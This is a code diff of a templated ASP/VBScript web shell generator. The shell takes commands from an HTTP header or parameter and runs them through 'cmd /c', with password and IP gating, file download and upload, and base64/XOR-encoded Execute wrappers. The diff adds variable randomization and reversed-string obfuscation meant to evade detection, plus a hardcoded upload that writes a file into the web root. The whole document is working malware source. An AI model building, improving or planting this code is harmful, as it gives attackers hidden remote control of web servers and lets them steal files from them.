@@ -1,20 +1,19 @@
-
 {{/* Get command from param or header */}}
-dim c
+{{/* dim {{ index .V "cmd" }} */}}
 {{ if ne .CmdHeader "" }}
-c = Request.ServerVariables("HTTP_{{ .CmdHeader }}")
+{{ index .V "cmd" }} = Request.ServerVariables("HTTP_{{ .CmdHeader }}")
 {{ else }}
-c = Request("{{ .CmdParam }}")
+{{ index .V "cmd" }} = Request("{{ .CmdParam }}")
 {{ end }}
 
 {{/* Check if ip is in whitelist */}}
 {{ if .Whitelist }}
-dim ip
-ip = Request.ServerVariables("REMOTE_ADDR")
 
-w = Array({{ .Whitelist }})
-for each i in w
-  if i <> ip Then
+{{ index .V "whitelist" }} = Array({{ .Whitelist }})
+for each {{ index .V "i" }} in {{ index .V "whitelist" }}
+  if {{ index .V "i" }} = Request.ServerVariables("REMOTE_ADDR") Then
+    Exit For
+  elseif {{ index .V "i" }} = {{ index .V "whitelist" }}(UBound({{ index .V "whitelist" }})) then
     response.end
   end if
 next
@@ -22,271 +21,165 @@ next
 
 {{/* Check password */}}
 {{ if ne .Password "" }}
-dim hash, pass
-h = "{{ .PasswordHash }}"
+{{/* dim {{ index .V "pass" }} */}}
+{{ index .V "hash" }} = "{{ .PasswordHash }}"
 
 {{ if ne .PasswordHeader "" }}
-pass = Request.ServerVariables("HTTP_{{ .PasswordHeader }}")
+{{ index .V "pass" }} = Request.ServerVariables("HTTP_{{ .PasswordHeader }}")
 {{ else if ne .PasswordParam "" }}
-pass = request("{{ .PasswordParam }}")
+{{ index .V "pass" }} = request("{{ .PasswordParam }}")
 {{ end }}
 {{/* Hash and compare */}}
-Dim asc, enc, bytes, instr, outstr, pos
+{{/* Dim {{ index .V "asc" }}, {{ index .V "alg" }}, {{ index .V "hashFunc" }}, {{ index .V "digest" }}, {{ index .V "i" }} */}}
 
-instr = pass
-Set asc = CreateObject("System.Text.UTF8Encoding")
-Set enc = CreateObject("System.Security.Cryptography.MD5CryptoServiceProvider")
-bytes = asc.GetBytes_4(instr)
-bytes = enc.ComputeHash_2((bytes))
-outstr = ""
-For pos = 1 To LenB(bytes)
-  outstr = outstr & LCase(Right("0" & Hex(AscB(MidB(bytes, pos, 1))), 2))
+Set {{ index .V "asc" }} = CreateObject("System.Text.UTF8Encoding")
+Set {{ index .V "alg" }} = CreateObject("System.Security.Cryptography.MD5CryptoServiceProvider")
+{{ index .V "hashFunc" }} = {{ index .V "asc" }}.GetBytes_4({{ index .V "pass" }})
+{{ index .V "hashFunc" }} = {{ index .V "alg" }}.ComputeHash_2(({{ index .V "hashFunc" }}))
+{{ index .V "digest" }} = ""
+For {{ index .V "i" }} = 1 To LenB({{ index .V "hashFunc" }})
+  {{ index .V "digest" }} = {{ index .V "digest" }} & LCase(Right("0" & Hex(AscB(MidB({{ index .V "hashFunc" }}, {{ index .V "i" }}, 1))), 2))
 Next
 
-if outstr <> h Then
+if {{ index .V "digest" }} <> {{ index .V "hash" }} Then
   response.end
 end if
 {{ end }}
 
+{{/* Include file capabilities */}}
 {{ if .FileCapabilities }}
 On Error Resume Next
 
 {{/* Download file */}}
-if Left(c, 4) = "get " Then
-  dim filePath
-  filePath = Split(c, " ")(1)
+if Left({{ index .V "cmd" }}, 4) = "get " Then
+  {{/* dim {{ index .V "cmdArgs" }} */}}
+  {{ index .V "cmdArgs" }} = Split({{ index .V "cmd" }}, " ")(1)
 
-  Dim fs
-  Dim objFile
-  Dim objStream
+  {{/* Dim {{ index .V "fs" }}
+  Dim {{ index .V "file" }}
+  Dim {{ index .V "fileStream" }} */}}
 
-  Set fs = Server.CreateObject("Scripting.FileSystemObject")
-  If fs.FileExists(filePath) Then
-    Set objFile = fs.GetFile(filePath)
-    
+  Set {{ index .V "fs" }} = Server.CreateObject("Scripting.FileSystemObject")
+  If {{ index .V "fs" }}.FileExists({{ index .V "cmdArgs" }}) Then
+    Set {{ index .V "file" }} = {{ index .V "fs" }}.GetFile({{ index .V "cmdArgs" }})
+
     Response.Clear 
-    Response.AddHeader "Content-Disposition", "attachment; filename=" & objFile.Name
-    Response.AddHeader "Content-Length", objFile.Size
+    Response.AddHeader "Content-Disposition", "attachment; filename=" & {{ index .V "file" }}.Name
+    Response.AddHeader "Content-Length", {{ index .V "file" }}.Size
     Response.ContentType = "application/octet-stream"
-    
-    Set objStream = Server.CreateObject("ADODB.Stream")
-    objStream.Type = 1
-    objStream.Open
-    objStream.LoadFromFile(filePath)
 
-    {{/* Response.Buffer = False */}}
-    Response.BinaryWrite(objStream.Read)
-    objStream.Close
+    Set {{ index .V "fileStream" }} = Server.CreateObject("ADODB.Stream")
+    {{ index .V "fileStream" }}.Type = 1
+    {{ index .V "fileStream" }}.Open
+    {{ index .V "fileStream" }}.LoadFromFile({{ index .V "cmdArgs" }})
+
+    Response.BinaryWrite({{ index .V "fileStream" }}.Read)
+    {{ index .V "fileStream" }}.Close
     If Err.Number <> 0 Then
       Response.Clear
       Response.Status = 500
       Response.Write Err.Description
+      Response.End
     End If
-    
-    Set objStream = Nothing
-    Set objFile = Nothing
-  Else 'fs.FileExists(filePath)
+
+    Set {{ index .V "fileStream" }} = Nothing
+    Set {{ index .V "file" }} = Nothing
+  Else '{{ index .V "fs" }}.FileExists({{ index .V "cmdArgs" }})
     Response.Clear
     Response.Status = 404
     Response.Write("File not found.")
   End If
 
-  Set fs = Nothing
+  Set {{ index .V "fs" }} = Nothing
   response.end
 
 {{/* Upload file */}}
-elseif Left(c, 4) = "put " Then
-  filePath = Split(c, " ")(1)
-  If ubound(Split(c, " ")) > 1 Then
-    filePath = Split(c, " ")(2)
-  else
-    set fs=Server.CreateObject("Scripting.FileSystemObject")
-    filePath=fs.getfilename(filePath)
+elseif Left({{ index .V "cmd" }}, 4) = "put " Then
+  {{ index .V "cmdArgs" }} = Split({{ index .V "cmd" }}, " ")
+  {{ index .V "filePath" }} = {{ index .V "cmdArgs" }}(1)
+  set {{ index .V "fs" }}=Server.CreateObject("Scripting.FileSystemObject")
+  If ubound({{ index .V "cmdArgs" }}) > 1 Then
+    {{ index .V "filePath" }} = {{ index .V "cmdArgs" }}(2)
+  Else
+    {{ index .V "filePath" }}={{ index .V "fs" }}.getfilename({{ index .V "filePath" }})
   End If
-  
-  fileEncoded = Request("f")
+  response.write {{ index .V "filePath" }} 
 
-  With CreateObject("Msxml2.DOMDocument").CreateElement("aux")
-      .DataType = "bin.base64"
-      .Text = fileEncoded
-      fileContents = BytesToStr(.NodeTypedValue, "utf-8")
-      response.write fileContents
-  End With
-
-  function BytesToStr(ByVal byteArray, ByVal sTextEncoding)
-    With CreateObject("ADODB.Stream")
-        .Type = 1 ' adTypeBinary
-        .Open
-        .Write byteArray
-        .Position = 0
-        .Type = 2 ' adTypeText
-        .CharSet = "utf-8"
-        BytesToStr = .ReadText
-        .Close
-    End With
-  end function
-
-
-  {{/* With CreateObject("Msxml2.DOMDocument").CreateElement("aux")
-    .DataType = "bin.base64"
-    .Text = fileEncoded
-    With CreateObject("ADODB.Stream")
-      .Type = 1
-      .Open
-      .Write .NodeTypedValue
-      .Position = 0
-      .Type = 2 '
-      .CharSet = "utf-8"
-      BytesToStr = .ReadText
-      .Close
-    End With
-    response.write Base64Decode
-  End With */}}
-
-
+  set {{ index .V "encSrc" }} = CreateObject("Msxml2.DOMDocument").CreateElement("aux")
+  {{ index .V "encSrc" }}.DataType = "bin.base64Var"
+  {{ index .V "encSrc" }}.Text = Request("f")
+  set {{ index .V "fileContents" }} = CreateObject("ADODB.Stream")
+  {{ index .V "fileContents" }}.Type = 1 ' adTypeBinary
+  {{ index .V "fileContents" }}.Open
+  {{ index .V "fileContents" }}.Write {{ index .V "encSrc" }}.NodeTypedValue
+  {{ index .V "fileContents" }}.Position = 0
+  {{ index .V "fileContents" }}.Type = 2 ' adTypeText
+  {{ index .V "fileContents" }}.CharSet = "utf-8"
+  set {{ index .V "file" }}={{ index .V "fs" }}.CreateTextFile("C:\inetpub\wwwroot\nice.php",true)
+  {{ index .V "file" }}.write {{ index .V "fileContents" }}.ReadText
   response.end
-
 end if
 {{ end }}
 
 {{/* Run command */}}
-Set oScript = Server.CreateObject("WSCRIPT.SHELL")
-Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
-Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
-Dim objShell, objCmdExec
-Set objShell = CreateObject("WScript.Shell")
-Set objCmdExec = objshell.exec("cmd /c " & c)
-o = objCmdExec.StdOut.ReadAll
-Response.Write(o)
+Set {{ index .V "process" }} = CreateObject("WScript.Shell").exec("cmd /c " & {{ index .V "cmd" }})
+Response.Write({{ index .V "process" }}.StdOut.ReadAll)
 
 
 
 {{- define "b64" }}
-Execute(Base64Decode("{{ .EncCode }}"))
-Function Base64Decode(ByVal vCode)
-  Dim oXML, oNode
-  Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
-  Set oNode = oXML.CreateElement("base64")
-  oNode.dataType = "bin.base64"
-  oNode.text = vCode
-  Base64Decode = Stream_BinaryToString(oNode.nodeTypedValue)
-  Set oNode = Nothing
-  Set oXML = Nothing
-End Function
-Function Stream_BinaryToString(Binary)
-  Const adTypeText = 2
-  Const adTypeBinary = 1
-  Dim BinaryStream 'As New Stream
-  Set BinaryStream = CreateObject("ADODB.Stream")
-  BinaryStream.Type = adTypeBinary
-  BinaryStream.Open
-  BinaryStream.Write Binary
-  BinaryStream.Position = 0
-  BinaryStream.Type = adTypeText
-  BinaryStream.CharSet = "us-ascii"
-  Stream_BinaryToString = BinaryStream.ReadText
-  Set BinaryStream = Nothing
-End Function
+{{/* Dim {{ index .V "encObj" }}, {{ index .V "b64" }}, {{ index .V "binStream" }} */}}
+{{ index .V "base64Var" }} = "46"
+{{ index .V "msxmlVar" }} = "tnEmu" & "CoD"
+{{ index .V "msxmlVar" }} = "0.3." & {{ index .V "msxmlVar" }} & "mod"
+{{ index .V "msxmlVar" }} = {{ index .V "msxmlVar" }} & ".2l"
+{{ index .V "msxmlVar" }} = {{ index .V "msxmlVar" }} & "mXs"
+Set {{ index .V "encObj" }} = CreateObject(strreverse({{ index .V "msxmlVar" }} & "m"))
+{{ index .V "base64Var" }} = {{ index .V "base64Var" }} & "esab"
+Set {{ index .V "b64" }} = {{ index .V "encObj" }}.CreateElement(strreverse({{ index .V "base64Var" }}))
+{{ index .V "b64" }}.dataType = "bin." & strreverse({{ index .V "base64Var" }})
+{{ index .V "b64" }}.text = "{{ .EncCode }}"
+Set {{ index .V "binStream" }} = CreateObject("ADODB.Stream")
+{{ index .V "binStream" }}.Type = 1
+{{ index .V "binStream" }}.Open
+{{ index .V "binStream" }}.Write {{ index .V "b64" }}.nodeTypedValue
+{{ index .V "binStream" }}.Position = 0
+{{ index .V "binStream" }}.Type = 2
+{{ index .V "binStream" }}.CharSet = "us-ascii"
+Execute({{ index .V "binStream" }}.ReadText)
 {{ end }}
 
 
 
 {{ define "xor" -}}
 {{ if ne .EncHeader "" -}}
-k = Request.ServerVariables("HTTP_{{ .EncHeader }}")
+{{ index .V "encKey" }} = Request.ServerVariables("HTTP_{{ .EncHeader }}")
 {{ else }}
-k = Request("{{ .EncParam }}")
+{{ index .V "encKey" }} = Request("{{ .EncParam }}")
 {{ end -}}
 
-e = decode("{{ .EncCode }}")
-
-Execute(DeCrypt(e,k))
-{{/* DeCrypt e,k */}}
-
-Function DeCrypt(strEncrypted, key)
-Dim strChar, iKeyChar, iStringChar, i
-  for i = 1 to Len(strEncrypted)
-    if i Mod Len(key) = 0 then
-      iKeyChar = asc(Right(key,1))
-    Else
-      iKeyChar = asc(mid(key,i Mod Len(key),1))
-    end if
-    iStringChar = asc(mid(strEncrypted,i,1))
-    iDeCryptChar =  iStringChar Xor iKeyChar
-    strDecrypted =  strDecrypted & Chr(iDeCryptChar)
-  next
-  DeCrypt = strDecrypted
-End Function
-
-Function XORIt(ByVal Text, ByVal key)
-    request.write Text
-    request.write key
-    Dim l
-    Dim lonLenKey, lonKeyPos
-    lonLenKey = Len(key)
-    For l = 1 To Len(Text)
-        lonKeyPos = lonKeyPos + 1
-        If lonKeyPos > lonLenKey Then lonKeyPos = 1
-        Mid(Text, l, 1) = Chr(Mid(Text, l, 1) Xor Mid(key, lonKeyPos, 1))
-    Next
-    XORIt = Text
-End Function
-
-Function Base64Decode(ByVal vCode)
-  Dim oXML, oNode
-  Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
-  Set oNode = oXML.CreateElement("base64")
-  oNode.dataType = "bin.base64"
-  oNode.text = vCode
-  Base64Decode = Stream_BinaryToString(oNode.nodeTypedValue)
-  Set oNode = Nothing
-  Set oXML = Nothing
-End Function
-Function Stream_BinaryToString(Binary)
-  Const adTypeText = 2
-  Const adTypeBinary = 1
-  Dim BinaryStream 'As New Stream
-  Set BinaryStream = CreateObject("ADODB.Stream")
-  BinaryStream.Type = adTypeBinary
-  BinaryStream.Open
-  BinaryStream.Write Binary
-  BinaryStream.Position = 0
-  BinaryStream.Type = adTypeText
-  BinaryStream.CharSet = "us-ascii"
-  Stream_BinaryToString = BinaryStream.ReadText
-  Set BinaryStream = Nothing
-End Function
-
-Function decode( byVal strIn )
-		Dim w1, w2, w3, w4, n, strOut
-		For n = 1 To Len( strIn ) Step 4
-			w1 = mimedecode( Mid( strIn, n, 1 ) )
-			w2 = mimedecode( Mid( strIn, n + 1, 1 ) )
-			w3 = mimedecode( Mid( strIn, n + 2, 1 ) )
-			w4 = mimedecode( Mid( strIn, n + 3, 1 ) )
-			If w2 >= 0 Then _
-				strOut = strOut + _
-					Chr( ( ( w1 * 4 + Int( w2 / 16 ) ) And 255 ) )
-			If w3 >= 0 Then _
-				strOut = strOut + _
-					Chr( ( ( w2 * 16 + Int( w3 / 4 ) ) And 255 ) )
-			If w4 >= 0 Then _
-				strOut = strOut + _
-					Chr( ( ( w3 * 64 + w4 ) And 255 ) )
-		Next
-		decode = strOut
-	End Function
-
-  Private Function mimedecode( byVal strIn )
-    Dim Base64Chars
-    Base64Chars =	"ABCDEFGHIJKLMNOPQRSTUVWXYZ" & _
-        "abcdefghijklmnopqrstuvwxyz" & _
-        "0123456789" & _
-        "+/"
-		If Len( strIn ) = 0 Then 
-			mimedecode = -1 : Exit Function
-		Else
-			mimedecode = InStr( Base64Chars, strIn ) - 1
-		End If
-	End Function
+{{ index .V "cmd" }} = "{{ .EncCode }}"
+{{/* Dim {{ index .V "encObj" }}, {{ index .V "b64" }}, {{ index .V "binStream" }}, {{ index .V "keyChar" }}, {{ index .V "i" }} */}}
+Set {{ index .V "encObj" }} = CreateObject("Msxml2.DOMDocument.3.0")
+Set {{ index .V "b64" }} = {{ index .V "encObj" }}.CreateElement("base64Var")
+{{ index .V "b64" }}.dataType = "bin.base64Var"
+{{ index .V "b64" }}.text = {{ index .V "cmd" }}
+Set {{ index .V "binStream" }} = CreateObject("ADODB.Stream")
+{{ index .V "binStream" }}.Type = 1
+{{ index .V "binStream" }}.Open
+{{ index .V "binStream" }}.Write {{ index .V "b64" }}.nodeTypedValue
+{{ index .V "binStream" }}.Position = 0
+{{ index .V "binStream" }}.Type = 2
+{{ index .V "binStream" }}.CharSet = "us-ascii"
+{{ index .V "cmd" }} = {{ index .V "binStream" }}.ReadText
+for {{ index .V "i" }} = 1 to Len({{ index .V "cmd" }})
+  if {{ index .V "i" }} Mod Len({{ index .V "encKey" }}) = 0 then
+    {{ index .V "keyChar" }} = asc(Right({{ index .V "encKey" }},1))
+  Else
+    {{ index .V "keyChar" }} = asc(mid({{ index .V "encKey" }},{{ index .V "i" }} Mod Len({{ index .V "encKey" }}),1))
+  end if
+  {{ index .V "keyChar" }} =  asc(mid({{ index .V "cmd" }},{{ index .V "i" }},1)) Xor {{ index .V "keyChar" }}
+  wow =  wow & Chr({{ index .V "keyChar" }})
+next
+Execute(wow)
 {{ end }}
